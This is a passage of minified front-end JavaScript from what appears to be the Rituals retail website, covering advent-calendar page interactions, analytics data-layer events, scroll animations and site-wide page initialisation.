t=this;M(),e.stopPropagation(),e.preventDefault(),o(),$(this).addClass("btn-back-flip"),setTimeout((function(){$(t).closest(".js-advent-reveal-product")[0].classList.remove("advent-product-reveal-open"),$(t).removeClass("btn-back-flip")}),500),$(".advent-product-reveal").each((function(){$(this).removeClass("advent-toggle-animation")}))})),$(document).off("click.advent",".js-advent-ar-analytics").on("click.advent",".js-advent-ar-analytics",(function(e){var t=$(e.target),n=t.data("popup-data");if(n){var r,i,a,o=$(".js-egg-model-viewer"),s=t[0].classList[2],d="js-advent-btn-2d"==s?"2D":"js-advent-btn-3d"==s?"3D":"js-advent-btn-premium"==s?"premium":"js-advent-ar-button";"js-advent-ar-button"==d&&(d="js-advent-btn-2d"==(s=t[0].classList[3])?"2D":"js-advent-btn-3d"==s?"3D":"premium"),u()&&o&&o.length&&o[0].canActivateAR||(r=d,i=n,a={show:function(e,t,n){v(n),window.eventBus.$emit("shouldOpenModal",{resources:{heading:e.header,description:e.description},closeElement:{eventName:"onCloseElementClick",shouldCloseModal:!0},ctaHolder:{},easterModal:!0,icon:e.icon,QRcodeURL:t})}},c.toDataURL(l({triggerARMode:!0,skipAnimation:!0},["skipAnimation"],!0),{width:180}).then((function(e){a.show(i,e,r)})))}})),$(document).on("click",".js-tab-item",y),$(".js-partial-flip").on("click.advent",b),$(".js-btn-flip-full").on("click.advent",_),$(".js-advent-banner-btn").on("click.advent",w),$(document).off("click.advent",".js-advent-calendar-image").on("click.advent",".js-advent-calendar-image",(function(e){C("image",$(e.target).closest(".advent-comparison-item"))})),$(document).off("click.advent",".js-advent-calendar-text").on("click.advent",".js-advent-calendar-text",(function(e){C("text",$(e.target).closest(".advent-comparison-item"))})),$(".js-check-btn").on("click.advent",x),$(".js-advent-menu-item").on("click.advent",(function(e){k(e.target)})),$(document).off("click.advent",".js-header-logo").on("click.advent",".js-header-logo",(function(){E("rituals advent")})),$(document).off("click.advent",".js-nav-to-main").on("click.advent",".js-nav-to-main",(function(){E("visit rituals.com")})),$(document).off("click.advent",".js-pdp-back").on("click.advent",".js-pdp-back",(function(){E("back")})),$(document).off("click.advent",".js-advent-link").on("click.advent",".js-advent-link",(function(){E("whatsapp / messenger")})),$(document).off("click.advent",".advent-swatch-click").on("click.advent",".advent-swatch-click",(function(){var t=$(e).attributes.href.nodeValue;E(t.includes("2d")?"2D":t.includes("3d")?"3D":"premium")}))}function A(e){var t=e&&e.length?$(".js-advent-data-layer",e):$(".js-advent-data-layer");if(!t||!t.length)return null;var n=t.data("data-layer");return n?JSON.parse(JSON.stringify(n)):null}function m(){var e=A();if(!e)return null;var t=$(".js-images-wrapper");if(!t||!t.length)return null;var n=$(".js-pdp-images-slider",t);if(!n||!n.length)return null;var r=$(".slick-active",n);return r&&r.length?e.event_label=e.event_label+" - slide"+(r.data("slick-index")+1):e.event_label=e.event_label+" - slide1",e}function v(e){a.pushDataLayerEvent({event:"advent",click_target:"experience it with AR",selection:e})}function g(){$(document).off("click.advent",".gift-wrap-button").on("click.advent",".gift-wrap-button",(function(){a.pushDataLayerEvent({event:"advent",interaction:"video interection",click_target:"watch video"})}))}function y(){var e=$(this)[0].attributes["data-tab-label"].value,t=$(this)[0].attributes["data-type"].value;a.pushDataLayerEvent({event:"advent",interaction:"change tabs",click_target:e,selection:t})}function b(){var e=$(this)[0].attributes["data-days"].value,t=$(this)[0].attributes["data-type"].value,n="js-advent-btn-2d"==t?"2D":"js-advent-btn-3d"==t?"3D":"premium";a.pushDataLayerEvent({event:"advent",interaction:e,click_target:"view this gift",selection:n})}function _(){var e=$(this)[0].attributes["data-type"].value,t="js-advent-btn-2d"==e?"2D":"js-advent-btn-3d"==e?"3D":"premium";a.pushDataLayerEvent({event:"advent",interaction:"all products",click_target:"view this gift",selection:t})}function w(){var e=document.querySelector(".js-advent-banner-btn");a.pushDataLayerEvent({event:"advent",interaction:"button click",click_target:e.innerHTML})}function C(e,t){var n={id:t[0].attributes[1].value,name:t[0].attributes[2].value,price:t[0].attributes[3].value},r="landing page",i=document.body.querySelector(".scrollmagic-pin-spacer");i&&(r=i.children[0].className.includes("js-video-holder")?"landing page":"PDP");var o="image"==e?e:n.name.includes("2D")?"2D":n.name.includes("3D")?"3D":"premium";a.pushProductClickEvent(o,n,"advent",r)}function x(){var e=document.querySelector(".js-the-ritual-of-title").nextSibling.data;a.pushDataLayerEvent({event:"advent",interaction:"store click",click_target:"checked instore availability",selection:e.includes("2D")?"2D":e.includes("3D")?"3D":"premium"})}function S(e){if(null!==e){var t=e.attributes["data-description"].value,n=t.includes("2D")?"2D":t.includes("3D")?"3D":t.includes("Premium")?"premium":t.includes("Introducing")?"Introducing":"side by side";a.pushDataLayerEvent({event:"advent",interaction:"scroll dots",click_target:t,selection:n})}}function k(e){if(null!==e){var t=e.innerHTML,n=e.innerHTML.includes("2D")?"2D":e.innerHTML.includes("3D")?"3D":e.innerHTML.includes("Premium")?"premium":e.innerHTML.includes("Introducing")?"Introducing":"Side by side";a.pushDataLayerEvent({event:"advent",interaction:"calendar tabs",click_target:t,selection:n})}}function M(){a.pushDataLayerEvent({event:"advent",interaction:"button click",click_target:"close",page_type:"product overlay"})}function B(e){var t="content page",n=document.body.querySelector(".scrollmagic-pin-spacer");n&&(t=n.children[0].className.includes("js-video-holder")?"content page":"PDP"),a.pushDataLayerEvent({event:"advent",interaction:"faq expand",page_type:t,selection:e})}function E(e){var t=document.querySelector(".advent-pdp"),n=document.querySelector(".js-the-ritual-of-title").parentNode.innerText,r=n.includes("2D")?"2D":n.includes("3D")?"3D":"premium";t&&a.pushDataLayerEvent({event:"advent",interaction:"pdp click",selection:r,click_target:e})}var T={init:function(){var e,t,n,i;0<d.length&&(function(){var e;(e=$(".js-responsive-image")).length&&e.each((function(){var e=$(this);r()?""!==e.attr("data-mobile-image")?e.attr("src",e.data("mobile-image")):e.attr("src",e.data("desktop-image")):""!==e.data("desktop-image")&&e.attr("src",e.data("desktop-image"))}))}(),f(),function(){var e="js-data-layer-product-pushed",t=$(".js-advent-block"),n=t.not("."+e);if(0!==n.length){var r=[];n.each((function(n,i){var a=$(".js-advent-datalayer-product",i);if(0<a.length){var o=JSON.parse(a.val());if(o){var s=t.index(i);o.position=s+1,r.push(o)}}$(i).addClass(e)})),0<r.length&&a.pushProducts(r)}}(),$(".js-advent-order-0").appendTo($(".js-comparison-block")),$(".js-advent-order-1").appendTo($(".js-comparison-block")),$(".js-advent-order-2").appendTo($(".js-comparison-block")),n=document.querySelectorAll(".advent-block-snap"),i=new IntersectionObserver((function(e){e.forEach((function(e){e.isIntersecting&&e.target.classList.add("advent-show")}))}),{rootMargin:"-10px"}),n.forEach((function(e){i.observe(e)})),$(".advent-comparison-subhead").each((function(){$(this).closest(".advent-comparison-item").hasClass("advent-premium-item")&&$(this).addClass("advent-shimmer-text")})),g(),function(){var e=document.querySelectorAll(".js-advent-nav-section"),t=document.querySelectorAll(".js-advent-dots"),n=document.querySelectorAll(".js-advent-menu-item"),i=document.querySelector(".js-advent-menu-items"),a=document.querySelector(".js-menu-list-advent"),o=!!i&&i.getBoundingClientRect().width>a.getBoundingClientRect().width,s=0!=e.length&&0!=n.length&&0!=t.length,l="",c="",u=null;if(s){var d=new IntersectionObserver((function(e){var i,s=_createForOfIteratorHelper(e);try{for(s.s();!(i=s.n()).done;){var d=i.value;d.isIntersecting&&(c=d.target.dataset.adventsection,l!=c&&(t.forEach((function(e){e.classList.remove("advent-navigation-dot-filled"),e.classList.contains(c)&&(u=e).classList.add("advent-navigation-dot-filled")})),n.forEach((function(e){var t,n,i;e.classList.remove("advent-current-section"),e.classList.contains(c)&&(e.classList.add("advent-current-section"),o&&(t=a,n=e.getBoundingClientRect().x,r(),40,i=t.scrollLeft+(n-40),t.scroll({left:i,behavior:"smooth"})))})),S(u)),l=c)}}catch(e){s.e(e)}finally{s.f()}}),{threshold:.03});e.forEach((function(e){d.observe(e)})),i&&(i.getBoundingClientRect().width<window.innerWidth?i.classList.add("full-width-menu"):i.classList.remove("full-width-menu"))}}(),function(){function e(){$(".usabilla_live_button_container").length&&$(".usabilla_live_button_container").addClass("usabilla-btn-position")}$(window).on("load",(function(){setTimeout(e,500)}))}(),$(window).on("load",(function(){setTimeout((function(){$(".js-generic-flyout").addClass("advent-out-of-stock")}),500)})),e=document.querySelectorAll(".advent-swatch-item "),t=document.querySelector(".advent-swatch-item.advent-shimmer-frame"),e.length&&t.length&&(t.querySelector("video").muted=!0,t.querySelector("video").play(),r()||e.forEach((function(e){e.addEventListener("mouseover",(function(){t.querySelector("video").pause(),e.querySelector("video").muted=!0,e.querySelector("video").play()})),e.addEventListener("mouseout",(function(){e.querySelector("video").pause(),t.querySelector("video").play()}))}))),0<$(".js-christmas-tree-mobile").length&&$(".js-btn-flip-full").on("click",(function(){s(),$(".advent-open-product-full").addClass("advent-product-reveal-open")})))},pushAdventDataLayerDataWithActiveProductImageSlide:function(e){var t=m();t&&(e&&(t.event_action=e),a.pushDataLayerEvent(t))},pushAdventDataLayerDataForProductExperienceBlock:function(e,t,n,r){var i=A(e);if(!i)return null;t&&(i.event_action=t),r&&(i.event_category=r),n&&(i.event_label=i.event_label+" - slide"+n),a.pushDataLayerEvent(i)},pushAdventDataLayerDataForFAQBlock:function(e){var t=A();t?(t.event_category="faq",t.event_action="faq click",e&&(t.event_label=e),a.pushDataLayerEvent(t)):B(e)},getAdventDataLayerDataWithActiveProductImageSlide:m,pushGiftWrappingBtnEvent:g,pushExperienceBtnEvent:v,updateARbuttons:function(e,t,n){if(e&&t&&n){var r=$(".js-advent-ar-button");if(r&&r.length){var i=r.data("popup-data");i&&(i.src=e,i.iosSrc=t,i.description=n,r.attr("data-popup-data",JSON.stringify(i)))}}},updateARmodel:function(e,t){if(e&&t){var n=$(".js-egg-model-viewer");n&&n.length&&(n.attr("src",e),n.attr("ios-src",t))}},pushDetailTabsEvent:y,pushPngSequenceEvent:b,pushPngSequenceEventFullReveal:_,pushShopCalendarsEvent:w,pushProductClickEvent:C,pushCheckAvailabilityEvent:x,pushScrollBtnEvent:S,pushClickedTabsEvent:k,pushCloseButtonEvent:M,pushFAQBtnEvent:B,pushPDPClick:E};t.exports=T},{"./modules/google":474,"./modules/helpers/isSmallView":487,"./modules/helpers/isTouchDevice":491,"./modules/helpers/scroll":493,"./modules/util/getUpdatedURLWithParams":512,qrcode:238}],287:[function(e,t,n){var r=e("./advent"),i=".js-reveal-trigger",a=function(e){var t=$(e.currentTarget).closest(".js-reveal");t.hasClass("reveal")?(t.removeClass("reveal"),setTimeout((function(){t.removeClass("revealed")}),1e3)):(t.addClass("reveal"),setTimeout((function(){t.toggleClass("revealed")}),1e3)),r.pushAdventDataLayerDataWithActiveProductImageSlide("reveal contents")},o={init:function(){0<$(i).length&&$(i).on("click",a)}};t.exports=o},{"./advent":286}],288:[function(e,t,n){var r,i=e("./modules/util/elementInViewport"),a=".js-anim-block",o=function(){clearTimeout(r),r=setTimeout(s,10)},s=function(){$(a).each((function(e,t){l(t)}))},l=function(e){i(e,0)?($(e).removeClass("not-in-viewport"),$(e).addClass("in-viewport")):($(e).removeClass("in-viewport"),$(e).addClass("not-in-viewport"))},c={init:function(){var e;"IntersectionObserver"in window&&"IntersectionObserverEntry"in window&&"intersectionRatio"in window.IntersectionObserverEntry.prototype?(e=new IntersectionObserver((function(e){var t,n=_createForOfIteratorHelper(e);try{for(n.s();!(t=n.n()).done;){var r=t.value,i=$(r.target);!0===r.isIntersecting?(i.removeClass("not-in-viewport"),i.addClass("in-viewport")):(i.removeClass("in-viewport"),i.addClass("not-in-viewport"))}}catch(e){n.e(e)}finally{n.f()}}),{threshold:[.05]}),$(a).each((function(t,n){e.observe(n)}))):0<$(a).length&&($(window).on("scroll",o),$(a).not(".js-anim-queued").each((function(e,t){l(t)})))}};t.exports=c},{"./modules/util/elementInViewport":500}],289:[function(e,t,n){var r=".js-animated-counter",i=new IntersectionObserver((function(e){var t,n=_createForOfIteratorHelper(e);try{for(n.s();!(t=n.n()).done;){var r=t.value;if(r.isIntersecting){var o=r.target,s=parseInt(o.dataset.counterValue)||0,l=o.dataset.counterUnit||"",c=100<s?.05:.5,u=Math.min(Math.ceil(s*c),300);a(o,s-u,s,l),i.unobserve(o)}}}catch(e){n.e(e)}finally{n.f()}}),{threshold:[.33]}),a=function(e,t,n,r){for(var i,a,o=0,s=n-t,l=100<s?4:1,c=0;c<=s;c+=l)!function(n,i){setTimeout((function(){e.innerHTML=(t+n).toLocaleString("en-NL")+r}),o)}(c),5e3,a=s,o=0===(i=c)?0:5e3*Math.pow(2,10*(i/a-1))+0},o={init:function(){0<document.querySelectorAll(r).length&&document.querySelectorAll(r).forEach((function(e){i.observe(e)}))}};t.exports=o},{}],290:[function(e,t,n){var r=window.SitePreferences||{},i=window.Resources||{},a=(e("./dam/responsive_image"),e("./dam/responsive_video"),e("./header-menu")),o=e("./navigation"),s=e("./components/checkout/header/header"),l=e("./countries"),c=e("./productBackButton"),u=e("./modules/google"),d=e("./flyout"),p=e("./minicart"),h=e("./page"),f=e("./rating"),A=e("./tooltip"),m=e("./validator"),v=e("./tls"),g=e("./category-refinements"),y=e("./rituals-styles"),b=e("./responsive-background"),_=e("./slick-slider"),w=e("./grid"),C=e("./select-custom"),x=e("object-fit-images"),S=e("./gst"),k=e("./pages/product/variant"),M=e("./pages/product/option"),B=e("./pages/product/addToCart"),E=e("./video"),T=e("./responsive-video"),P=e("./seo-text"),I=e("./tabs"),F=e("./backtotop"),L=e("./accordion"),O=e("./advent"),N=e("./giftsetfastlane"),D=e("./product-slider"),R=e("./product-filter"),j=e("./product-description"),U=e("./scrollAnimation"),z=e("./anim-block"),H=e("./sopost-helper"),V=e("./toaster"),Q=e("./sectionScroller"),G=e("./dragList"),W=e("./product-tile"),K=e("./footer"),q=e("./components/product-configurator/product-configurator-app"),X=e("./components/product-configurator-inline/product-configurator-inline-app"),Y=e("./components/checkout/checkout-app"),J=e("./components/vue-form/vue-form-app"),Z=e("./components/dynamic-form/dynamic-form-app"),ee=e("./components/modal/modal-app"),te=e("./components/flyin/flyin-app"),ne=e("./adventReveal"),re=e("./productExperience"),ie=e("./leadtime"),ae=e("./horizontal-product-scroll"),oe=e("./giftsetImageZoom"),se=e("./gift-reveal"),le=e("./social-commerce/social-commerce"),ce=e("./pages/collection/collection-ingredients"),ue=e("./easter/easter"),de=e("./easter/easter3d"),pe=e("./animated-counter"),he=e("./advent-moving-title"),fe=e("./advent-text"),Ae=e("./banner-small-src"),me=e("../js/pages/product/stickyaddtocart"),ve=e("./crm-reset-password"),ge={debounce:e("./modules/helpers/debounce"),isKeyCodeNumber:e("./modules/helpers/isKeyCodeNumber"),cookiesAccepted:e("./modules/helpers/cookiesAccepted")},ye={isMobile:e("./modules/util/isMobile"),isMobileOrTabletWidth:e("./modules/util/isMobileOrTabletWidth"),getQueryStringParams:e("./modules/util/getQueryStringParams"),getTriggerFromHash:e("./modules/util/getTriggerFromHash"),limitCharacters:e("./modules/util/limitCharacters")};function be(){if($(".js-checkout-sticky-bar").length){var e,t=$(window).scrollTop();if($(".pt_cart").length?e=$(".pt_cart .cart-actions .btn--submit"):$(".pt_checkout").length&&(e=$(".pt_checkout .js-checkout-step-content:visible .btn-submit")),0<e.length){var n=e.offset().top;n+e.outerHeight()<t||t+$(window).height()<n?($(".js-checkout-sticky-bar").addClass("show-bar"),$(".sticky-bar-spacer").addClass("show-bar")):($(".js-checkout-sticky-bar").removeClass("show-bar"),$(".sticky-bar-spacer").removeClass("show-bar"))}}}function _e(e,t,n){$(e).on("click",(function(){var e=$(this),r=e.siblings(t),i=e.siblings(n);e.hasClass("open")?(e.removeClass("open"),i.hide(),r.show()):(e.addClass("open"),r.hide(),i.show())}))}var we={account:e("./pages/account"),cart:e("./pages/cart"),compare:e("./pages/compare"),product:e("./pages/product"),collection:e("./pages/collection"),registry:e("./pages/registry"),search:e("./pages/search"),wishlist:e("./pages/wishlist"),storelocator:e("./pages/storelocator"),singlepagecheckout:e("./pages/checkout/singlepagecheckout"),checkout:e("./pages/checkout/checkoutlogin"),orderconfirmation:e("./pages/checkout/orderconfirmation"),faq:e("./pages/faq"),jobs:e("./pages/jobs"),mag:e("./pages/magazine"),customerservice:e("./customerservice"),newsletter:e("./newsletter"),productsamples:e("./productsamples"),promotions:e("./pages/promotions"),customerbarcode:e("./pages/customerbarcode"),giftcard:e("./pages/giftcard"),outlet:e("./pages/outlet"),hairtemple:e("./pages/hairtemple-landing"),registration:e("./pages/registration"),whereIsMyOrder:e("./pages/whereIsMyOrder/whereIsMyOrder"),faqredesign:e("./pages/faqredesign")},Ce=function(){0===document.cookie.length&&$("<div/>").addClass("browser-compatibility-alert").append($("<p/>").addClass("browser-error").html(i.COOKIES_DISABLED)).appendTo("#browser-check"),$("html").addClass("js"),r.LISTING_INFINITE_SCROLL&&$("html").addClass("infinite-scroll"),ye.limitCharacters(),function(){var e=["8","13","46","45","36","35","38","37","40","39"];ye.isMobile()||$(".js-skip-to-content").focus(),$("body").on("keydown","textarea[data-character-limit]",(function(t){var n=$.trim($(this).val());$(this).data("character-limit")<=n.length&&e.indexOf(t.which.toString())<0&&t.preventDefault()})).on("change keyup mouseup","textarea[data-character-limit]",(function(){var e=$.trim($(this).val()),t=$(this).data("character-limit")-e.length;t<0&&($(this).val(e.slice(0,t)),t=0),$(this).next("div.char-count").find(".char-remain-count").html(t)})),$(".secondary-navigation .toggle").click((function(){$(this).toggleClass("expanded").next("ul").toggle()})),$(".toggle").next(".toggle-content").hide(),$(".toggle").click((function(){$(this).toggleClass("expanded").next(".toggle-content").toggle()})),$(document).on("keypress input copy",".js-min-price, .js-max-price, .js-price-filter-min, .js-price-filter-max",(function(e){var t=e.which?e.which:e.keyCode;return ge.isKeyCodeNumber(t)}));var t=$(".subscribe-email");0<t.length&&t.focus((function(){var e=$(this.val());0<e.length&&e!==i.SUBSCRIBE_EMAIL_DEFAULT||$(this).animate({color:"#999999"},500,"linear",(function(){$(this).val("").css("color","#333333")}))})).blur((function(){0<$.trim($(this.val())).length||$(this).val(i.SUBSCRIBE_EMAIL_DEFAULT).css("color","#999999").animate({color:"#333333"},500,"linear")})),$(".js-scrolltotop").on("click",(function(){$("html, body").animate({scrollTop:$("body").offset().top},800)}));var n=$(".js-gwp-welcome-overlay");ye.isMobile()&&0<n.length&&!n.hasClass("hide")&&V.load({url:Urls.getGwpWelcomeToastMessage+"?currentPipeline="+Urls.currentPipeline}),$(document).on("click keydown",".js-linked-block",(function(e){var t=$(this).data("href");("keydown"==e.type&&"13"==e.which||"click"==e.type)&&(window.location.href=t)})),$(".js-form").length&&$(".js-form").find(".label-inline").each((function(){var e=$(this).find("input:checked"),t=$(this).find("label");e.length&&$(this).find("label").addClass("checked"),t.each((function(){$(this).on("click",(function(){$(this).closest(".label-inline").find("input").on("change",(function(){$(this).is(":checked")?$(this).closest(".label-inline").find("label").addClass("checked"):$(this).closest(".label-inline").find("label").removeClass("checked")}))}))}))})),0<$(".crm-in-store-register").length&&0<$('input[name="dwfrm_profile_customer_loyalty_addtoloyaltysmslist"]').length&&($('input[name="dwfrm_profile_customer_loyalty_smsPhone"]').closest(".form-row").hide(),$('input[name="dwfrm_profile_customer_loyalty_addtoloyaltysmslist"]').on("click",(function(){$(this).prop("checked")?($('input[name="dwfrm_profile_customer_loyalty_smsPhone"]').closest(".form-row").addClass("form-number-visible"),$('input[name="dwfrm_profile_customer_loyalty_smsPhone"]').closest(".form-row").fadeIn()):($('input[name="dwfrm_profile_customer_loyalty_smsPhone"]').closest(".form-row").removeClass("form-number-visible"),$('input[name="dwfrm_profile_customer_loyalty_smsPhone"]').closest(".form-row").hide())}))),$(document).on("click",".js-checkout-opening-hours-button",(function(){var e=$(this);e.toggleClass("open"),e.next(".js-checkout-opening-hours-list").stop().slideToggle()})),_e(".js-discover-toggle",".js-discover-short",".js-discover-long"),_e(".js-cop-desc-toggle",".js-cop-short-desc",".js-cop-long-desc"),be(),$(".js-animated-banner").length&&!$(".js-animated-banner").closest(".js-encode").length&&$(".fade-in-element").each((function(e,t){setTimeout((function(){$(t).addClass("visible")}),800*e)})),$(window).scroll((function(){be()}))}(),ee.init(),te.init(),y.initInputStyles(),a.init(),o.init(),s.init(),A.init(),d.init(),p.init(),m.init(),f.init(),g.init(),j.init(),x(),B.init(),k(),M(),E.initGeneric(),T.init(),ie.init(),se.init(),le.init(),ue.init(),pe.init(),he.init(),N.init(),0<$(".world").length&&de.init(),0<$(".js-product-container-giftset").length&&oe.init(),0<$(".js-advent-block").length&&O.init(),0<$(".js-advent-split").length&&fe.init(),0<$(".js-product-slider-steps").length&&D.init(),0<$(".js-product-filter-block").length&&R.init(),0<$(".product-list-slider-block").length&&W.init(),0<$(".banner-small").length&&Ae.init(),0<$(".js-onboarding-page").length&&me.init(),0<$(".js-crm-reset-password").length&&ve.init(),$.extend(h,window.pageContext);var e=h.ns;e&&we[e]&&we[e].init&&we[e].init(),"sg"!==e&&(y.initLazyLoad(),y.prepareAnimBlocks(),C.init(),P.init(),I.init(),F.init(),L.init(),b.init(),u.places.init(),u.tagManager.init(),z.init(),H.init(),Q.init(),U.init(),_.init(),ae.init(),$(".js-concept-highlight-block").length&&y.initConceptHighlightHeight()),"singlepagecheckout"!==e&&"checkout"!==e&&"sg"!==e&&l.init(),"content"===e&&we.customerbarcode.init({format:"ean13",fontSize:0,margin:0,height:28}),"singlepagecheckout"===e&&we.checkout.SendCheckoutLoginEvent(),!0===r.CHECK_TLS&&v.getUserAgent(),0<$(".js-gst-wrapper").length&&"sg"!==e&&S.init(),ce.init(),c.init(),xe(),function(){var e=ye.getQueryStringParams(window.location.href).jumpto,t=ye.getTriggerFromHash();if(e||0!==t.length){var n=e||t;document.querySelector("[data-anchor-id="+n+"]").hasAttribute("data-anchor-islazyloaded")&&document.dispatchEvent(new CustomEvent("shouldTriggerLazyload",{detail:n})),setTimeout((function(){y.jumpToAnchor(n)}),1e3)}}(),$(document).on("click","[data-jump-to]",(function(e){e.preventDefault(),y.jumpToAnchor($(this).data("jump-to"))})),K.init(),$('a[href=""]').on("click",(function(e){e.preventDefault()})),$(".js-show-switch-session-modal")&&$(".js-show-switch-session-modal").length&&le.showSwitchSessionModal()};function xe(){if($(".js-collection-ingredients").length){var e=$(window).height()/2,t=$(".js-collection-ingredients"),n=$(".js-collection-ingredient-col:first-child"),r=$(".js-collection-ingredient-col:last-child");t[0].getBoundingClientRect().top<e&&(n.addClass("col-fadein"),setTimeout((function(){r.addClass("col-fadein")}),1e3))}}function Se(){var e=$(".js-sticky-top-message-bar.loaded"),t=$(".js-sticky-top-message-placeholder");t[0].getBoundingClientRect().top<=0?(e.addClass("sticky"),t.addClass("in-place")):(e.removeClass("sticky"),t.removeClass("in-place"))}String.format=function(){for(var e=arguments[0],t=arguments.length-1,n=0;n<t;n++){var r=new RegExp("\\{"+n+"\\}","gm");e=e.replace(r,arguments[n+1])}return e},$(document).ready((function(){Ce()})),$(window).on("load",(function(){var e,t;w.init(),"sg"!==h.ns&&(G.init(),ne.init(),re.init()),Y.init(),J.init(),Z.init(),we.product.initOnDomReady(),q.init(),X.init(),ge.cookiesAccepted()&&E.initGeneric(),ye.isMobile()||y.initCustomScrollbar(),ye.isMobileOrTabletWidth()&&p.initMobileConfirmation(),$(".js-toaster-container, .js-reset-password-confirmation, .js-new-password-confirmation").addClass("page-loaded"),$(".js-page-fullheight").length&&!ye.isMobileOrTabletWidth()&&y.initBottomFooterPosition(),$(".js-sticky-top-message-bar").length&&(t=(e=$(".js-sticky-top-message-bar")).outerHeight(),$(".js-sticky-top-message-placeholder").css("height",t),setTimeout((function(){e.addClass("loaded"),Se()}),1e3));var n=$("#usntA40Toggle a");!ye.isMobile()&&0<n.length&&(n.parent().attr("tabindex",0),n.parent().trigger("focus"),n.on("blur",(function(){setTimeout((function(){$(".js-skip-to-content").trigger("focus")}),200)})))})),$(window).on("resize",ge.debounce((function(){$(".js-page-fullheight").length&&!ye.isMobileOrTabletWidth()&&y.initBottomFooterPosition(),$(".js-concept-highlight-block").length&&!ye.isMobile()&&y.initConceptHighlightHeight()}),200)),$(window).on("scroll",(function(){xe(),$(".js-sticky-top-message-bar").length&&Se()}))},{"../js/pages/product/stickyaddtocart":574,"./accordion":282,"./advent":286,"./advent-moving-title":284,"./advent-text":285,"./adventReveal":287,"./anim-block":288,"./animated-counter":289,"./backtotop":291,"./banner-small-src":292,"./category-refinements":296,"./components/checkout/checkout-app":303,"./components/checkout/header/header":334,"./components/dynamic-form/dynamic-form-app":375,"./components/flyin/flyin-app":377,"./components/modal/modal-app":379,"./components/product-configurator-inline/product-configurator-inline-app":384,"./components/product-configurator/product-configurator-app":401,"./components/vue-form/vue-form-app":416,"./countries":427,"./crm-reset-password":428,"./customerservice":429,"./dam/responsive_image":431,"./dam/responsive_video":432,"./dragList":434,"./easter/easter":435,"./easter/easter3d":436,"./flyout":447,"./footer":448,"./gift-reveal":450,"./giftsetImageZoom":452,"./giftsetfastlane":453,"./grid":458,"./gst":459,"./header-menu":461,"./horizontal-product-scroll":462,"./leadtime":463,"./minicart":467,"./modules/google":474,"./modules/helpers/cookiesAccepted":475,"./modules/helpers/debounce":476,"./modules/helpers/isKeyCodeNumber":483,"./modules/util/getQueryStringParams":509,"./modules/util/getTriggerFromHash":511,"./modules/util/isMobile":514,"./modules/util/isMobileOrTabletWidth":515,"./modules/util/limitCharacters":519,"./navigation":532,"./newsletter":533,"./page":534,"./pages/account":535,"./pages/cart":536,"./pages/checkout/checkoutlogin":540,"./pages/checkout/orderconfirmation":542,"./pages/checkout/singlepagecheckout":544,"./pages/collection":550,"./pages/collection/collection-ingredients":547,"./pages/compare":551,"./pages/customerbarcode":552,"./pages/faq":553,"./pages/faqredesign":554,"./pages/giftcard":555,"./pages/hairtemple-landing":556,"./pages/jobs":557,"./pages/magazine":558,"./pages/outlet":560,"./pages/product":568,"./pages/product/addToCart":566,"./pages/product/option":570,"./pages/product/variant":576,"./pages/promotions":578,"./pages/registration":579,"./pages/registry":580,"./pages/search":582,"./pages/storelocator":583,"./pages/whereIsMyOrder/whereIsMyOrder":584,"./pages/wishlist":586,"./product-description":591,"./product-filter":592,"./product-slider":595,"./product-tile":596,"./productBackButton":597,"./productExperience":598,"./productsamples":599,"./rating":602,"./responsive-background":604,"./responsive-video":605,"./rituals-styles":608,"./scrollAnimation":609,"./sectionScroller":611,"./select-custom":612,"./seo-text":613,"./slick-slider":614,"./social-commerce/social-commerce":615,"./sopost-helper":616,"./tabs":620,"./tls":621,"./toaster":622,"./tooltip":623,"./validator":624,"./video":625,"object-fit-images":226}],291:[function(e,t,n){var r=e("./modules/helpers/isInViewport"),i=e("./modules/helpers/isAboveViewport"),a=$(".js-scrolltotop");function o(){var e=$(".stay-informed");if(e.length)return r(e)||i(e)?(a.addClass("not-fixed"),void a.css("margin-bottom",e.outerHeight())):void a.removeClass("not-fixed").css("margin-bottom","");var t=$(".js-footer");$(".footer"),t.length&&r(t)?a.addClass("not-fixed"):a.removeClass("not-fixed")}var s={init:function(){var e,t;e=$(window).height(),t=$(document).scrollTop(),0<a.length&&!$(".sticky-bar").length&&$(window).on("scroll",(function(){var n=$(window).scrollTop(),r=$(document).scrollTop();e<n?(a.addClass("shown"),r<t?a.addClass("shown").removeClass("hide-on-mobile"):a.addClass("hide-on-mobile"),t=r):a.removeClass("shown"),o()})),$(".sticky-bar").length&&$(".js-scrolltotop").remove(),o()}};t.exports=s},{"./modules/helpers/isAboveViewport":478,"./modules/helpers/isInViewport":482}],292:[function(e,t,n){var r=e("./modules/helpers/isSmallView"),i={init:function(){0<document.querySelectorAll(".banner-small").length&&(0<$(".js-bannersmall-video").length&&(r()?$(".js-bannersmall-video source").attr("src",$(".js-bannersmall-video source").data("mobilev")):$(".js-bannersmall-video source").attr("src",$(".js-bannersmall-video source").data("desktopv")),$(".js-bannersmall-video")[0].load()),0<$(".js-bannersmall-image").length&&(r()&&void 0!==$(".js-bannersmall-image").data("mobilev")?$(".js-bannersmall-image").css("background-image","url("+$(".js-bannersmall-image").data("mobilev")+")"):$(".js-bannersmall-image").css("background-image","url("+$(".js-bannersmall-image").data("desktopv")+")")))}};t.exports=i},{"./modules/helpers/isSmallView":487}],293:[function(e,t,n){var r=e("./dialog"),i=e("./toaster"),a=e("./page"),o=e("./grid"),s=e("./modules/util/appendParamsToUrl"),l=e("./modules/util/ajaxUrl"),c=e("./minicart"),u=e("./pages/checkout/singlepagecheckout"),d=e("./modules/helpers/isDesktopOrTabletLandscapeView"),p=e("./actionQueue"),h=e("./modules/helpers/scroll"),f=!1,A=!1,m=!1,v=null;function g(e,t){var n=l(Urls.minicart);$.ajax({type:"GET",url:n,data:{pid:t}}).done((function(e){d()?c.show(e,!0):y.show({response:e},!1),c.updateHeaderCartIcon()})).fail((function(e){if(e.error)throw new Error(e.error)}))}var y={show:function(t,n){if(t.checkout?(m=!0,t.url+="&onCheckout=true"):t.response&&null!==t.response||(A=!0),t.onClose&&(v=t.onClose),t.url&&null!==t.url){if(t.isAddedPopup)return this.getGWPBanner(),void b(t);var r=1<t.url.split("?").length?"?"+t.url.split("?")[1]:"",o=null;$.ajax({type:"GET",url:Urls.getBonusProductsVueData+r}).done((function(n){o=n;var r=e("./components/products/product-choice-list/product-choice-list.vue"),i=o.bonusProducts.map((function(e){var 